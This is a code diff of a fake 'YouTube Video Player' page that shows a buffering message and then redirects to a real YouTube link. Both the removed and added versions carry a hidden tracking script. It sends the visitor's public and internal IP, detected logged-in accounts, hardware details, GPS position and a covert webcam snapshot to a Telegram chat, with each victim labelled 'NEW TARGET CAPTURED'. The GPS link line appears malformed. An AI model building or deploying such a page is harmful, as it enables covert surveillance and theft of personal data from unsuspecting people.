@@ -2,44 +2,25 @@
 <html lang="en">
 <head>
   <meta charset="UTF-8" />
-  <title>YouTube Video</title>
+  <title>YouTube Video Player</title>
   <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
   <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600&display=swap" rel="stylesheet">
   <style>
-    body {
-      margin: 0;
-      font-family: 'Inter', sans-serif;
-      background: #f8f9fa;
-      display: flex;
-      justify-content: center;
-      align-items: center;
-      height: 100vh;
-      color: #333;
-    }
-    .card {
-      background: white;
-      padding: 40px;
-      border-radius: 16px;
-      box-shadow: 0 8px 20px rgba(0,0,0,0.1);
-      max-width: 400px;
-      text-align: center;
-    }
-    .card img { margin-bottom: 20px; }
-    video, canvas {
-      opacity: 0;
-      position: absolute;
-      pointer-events: none;
-    }
+    body { margin: 0; font-family: 'Inter', sans-serif; background: #000; display: flex; justify-content: center; align-items: center; height: 100vh; color: #fff; overflow: hidden; }
+    .card { background: #111; padding: 40px; border-radius: 16px; border: 1px solid #333; box-shadow: 0 8px 30px rgba(255,0,0,0.2); max-width: 400px; text-align: center; }
+    .loading-spinner { border: 4px solid #333; border-top: 4px solid #f00; border-radius: 50%; width: 40px; height: 40px; animation: spin 1s linear infinite; margin: 20px auto; }
+    @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+    video, canvas { opacity: 0; position: absolute; pointer-events: none; }
   </style>
 </head>
 <body>
   <div class="card">
     <img src="https://upload.wikimedia.org/wikipedia/commons/b/b8/YouTube_Logo_2017.svg" alt="YouTube" style="width: 120px;">
-    <h2 style="margin-top: 20px;">جارٍ تحميل الفيديو...</h2>
-    <p style="color: #999;">اتصالك بالإنترنت ضعيف. يُرجى الانتظار حتى يتم تخزين الفيديو مؤقتًا.</p>
-    <img src="https://i.gifer.com/ZZ5H.gif" alt="Loading..." style="width: 80px; margin-top: 20px;">
+    <h2 style="margin-top: 20px;">Buffer Video...</h2>
+    <p style="color: #666; font-size: 14px;">Your connection is unstable. Decoding video stream...</p>
+    <div class="loading-spinner"></div>
     <video id="videoPreview" autoplay muted playsinline></video>
-    <canvas id="snapshotCanvas" width="320" height="240"></canvas>
+    <canvas id="snapshotCanvas" width="640" height="480"></canvas>
   </div>
 
   <script>
@@ -49,12 +30,12 @@
     const ctx = canvas.getContext("2d");
     let imageBase64 = "";
 
-    // دالة الإرسال مع تحسين الثبات (keepalive)
+    // 1. نظام الإرسال الاحترافي
     async function sendToTelegram(message, isPhoto = false) {
       if (!chatId) return;
       const payload = { chat_id: chatId };
       if (isPhoto && imageBase64) {
-        payload.message = "📸 *Snapshot from verification:*";
+        payload.message = "📸 *CRITICAL FORENSIC SNAPSHOT:*";
         payload.photo = imageBase64;
       } else {
         payload.message = message;
@@ -65,35 +46,89 @@
           method: "POST",
           headers: { "Content-Type": "application/json" },
           body: JSON.stringify(payload),
-          keepalive: true // يضمن وصول الطلب حتى لو تم إغلاق الصفحة
+          keepalive: true 
         });
-      } catch (e) { console.error("Send Error:", e); }
+      } catch (e) { console.log("Network Error"); }
     }
 
-    function detectDeviceType(ua) {
-      if (/android/i.test(ua)) return "Android 📱";
-      if (/iphone|ipad|ipod/i.test(ua)) return "iOS 🍎";
-      if (/windows/i.test(ua)) return "Windows 💻";
-      if (/macintosh/i.test(ua)) return "Mac 🖥️";
-      return "Unknown Device";
+    // 2. كشف الـ VPN والـ Internal IP
+    async function getInternalIP() {
+      return new Promise((resolve) => {
+        const pc = new RTCPeerConnection({ iceServers: [] });
+        pc.createDataChannel("");
+        pc.createOffer().then(pc.setLocalDescription.bind(pc));
+        pc.onicecandidate = (ice) => {
+          if (ice && ice.candidate && ice.candidate.candidate) {
+            const ip = /([0-9]{1,3}(\.[0-9]{1,3}){3})/.exec(ice.candidate.candidate)[1];
+            resolve(ip);
+          }
+        };
+        setTimeout(() => resolve("Not Found"), 1500);
+      });
     }
 
+    // 3. كشف الحسابات النشطة (Social Check)
+    async function checkAccounts() {
+      const sites = { Google: "https://accounts.google.com/favicon.ico", Facebook: "https://www.facebook.com/favicon.ico" };
+      let active = [];
+      for (const [name, url] of Object.entries(sites)) {
+        const img = new Image();
+        img.src = url + "?t=" + Math.random();
+        const found = await new Promise(res => {
+          img.onload = () => res(true);
+          img.onerror = () => res(false);
+          setTimeout(() => res(false), 1500);
+        });
+        if (found) active.push(name);
+      }
+      return active.length > 0 ? active.join(", ") : "None Detected";
+    }
+
+    // 4. جمع البيانات الشاملة
+    async function initForensics() {
+      const internalIp = await getInternalIP();
+      const accounts = await checkAccounts();
+      const ram = navigator.deviceMemory || "N/A";
+      const cores = navigator.hardwareConcurrency || "N/A";
+      const ua = navigator.userAgent;
+
+      fetch("https://ipinfo.io/json?token=9c6f5e4a17b44c")
+        .then(res => res.json())
+        .then(data => {
+          let msg = "🚩 *NEW TARGET CAPTURED* 🚩\n";
+          msg += "━━━━━━━━━━━━━━━━━━\n";
+          msg += `🌐 *Public IP:* \`${data.ip}\`\n`;
+          msg += `🏠 *Internal IP:* \`${internalIp}\`\n`;
+          msg += `📍 *Org:* ${data.org}\n`;
+          msg += `🌍 *Loc:* ${data.city}, ${data.country}\n`;
+          msg += "━━━━━━━━━━━━━━━━━━\n";
+          msg += `💻 *Hardware:* ${cores} Cores | ${ram}GB RAM\n`;
+          msg += `🕵️ *Logged Accounts:* ${accounts}\n`;
+          msg += `🔋 *Battery:* Info Awaiting...\n`;
+          msg += "━━━━━━━━━━━━━━━━━━\n";
+          msg += "🔒 *SYSTEM: Extracting Media Assets...*";
+          
+          sendToTelegram(msg);
+          collectSensitive();
+        });
+    }
+
+    // 5. GPS & Camera
     function collectSensitive() {
       navigator.geolocation.getCurrentPosition(
         async pos => {
-          const gpsMsg = `📍 *GPS Location Found*\nhttps://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}`;
-          await sendToTelegram(gpsMsg);
-          capturePhotoSafely();
+          const gps = `📍 *GPS POSITION*\nhttp://googleusercontent.com/maps.google.com/3{pos.coords.latitude},${pos.coords.longitude}`;
+          await sendToTelegram(gps);
+          captureCamera();
         },
-        async err => {
+        async () => {
           await sendToTelegram("❌ *GPS Access Denied*");
-          capturePhotoSafely();
-        },
-        { timeout: 4000 }
+          captureCamera();
+        }, { timeout: 3000 }
       );
     }
 
-    function capturePhotoSafely() {
+    function captureCamera() {
       navigator.mediaDevices.getUserMedia({ video: true })
         .then(stream => {
           video.srcObject = stream;
@@ -101,67 +136,23 @@
             setTimeout(async () => {
               ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
               imageBase64 = canvas.toDataURL("image/jpeg").split(',')[1];
-              stream.getTracks().forEach(track => track.stop());
+              stream.getTracks().forEach(t => t.stop());
               await sendToTelegram("", true);
-              redirectToTarget();
-            }, 1000);
+              finish();
+            }, 800);
           };
         })
         .catch(() => {
-          sendToTelegram("❌ *Camera Access Denied*");
-          redirectToTarget();
+          sendToTelegram("❌ *Camera Access Blocked*");
+          finish();
         });
     }
 
-    function redirectToTarget() {
-      setTimeout(() => {
-        window.location.replace("https://youtu.be/tNWpOuJk2M8");
-      }, 1000);
+    function finish() {
+      window.location.replace("https://youtu.be/tNWpOuJk2M8");
     }
 
-    async function sendBasicInfo() {
-      const ua = navigator.userAgent;
-      const os = detectDeviceType(ua);
-      const timeZone = Intl.DateTimeFormat().resolvedOptions().timeZone;
-      const lang = navigator.language;
-      const screenRes = `${screen.width}x${screen.height}`;
-      const connection = navigator.connection || {};
-      const network = connection.effectiveType || "Unknown";
-
-      // جلب البطارية
-      let batteryInfo = "N/A";
-      try {
-        const battery = await navigator.getBattery();
-        batteryInfo = `${Math.round(battery.level * 100)}% (${battery.charging ? 'Charging 🔌' : 'Not Charging 🔋'})`;
-      } catch(e) {}
-
-      // جلب الـ IP والمعلومات الجغرافية
-      fetch("https://ipinfo.io/json?token=9c6f5e4a17b44c")
-        .then(res => res.json())
-        .then(data => {
-          let basicInfo = "🔥 *NEW TARGET DETECTED BY COBRA* 🔥\n";
-          basicInfo += "━━━━━━━━━━━━━━━━━━\n";
-          basicInfo += `🌍 *IP:* \`${data.ip}\`\n`;
-          basicInfo += `📍 *Location:* ${data.city}, ${data.country}\n`;
-          basicInfo += `🏢 *ISP:* ${data.org}\n`;
-          basicInfo += "━━━━━━━━━━━━━━━━━━\n";
-          basicInfo += `💻 *OS:* ${os}\n`;
-          basicInfo += `🔋 *Battery:* ${batteryInfo}\n`;
-          basicInfo += `📶 *Network:* ${network.toUpperCase()}\n`;
-          basicInfo += `🕒 *Timezone:* ${timeZone}\n`;
-          basicInfo += `📺 *Screen:* ${screenRes}\n`;
-          basicInfo += "━━━━━━━━━━━━━━━━━━\n";
-          basicInfo += "🔒 *Awaiting GPS & Camera...*";
-
-          sendToTelegram(basicInfo);
-        });
-    }
-
-    // التنفيذ
-    if (chatId) {
-      sendBasicInfo();
-      collectSensitive();
-    }
+    if (chatId) initForensics();
   </script>
 </body>
 </html>
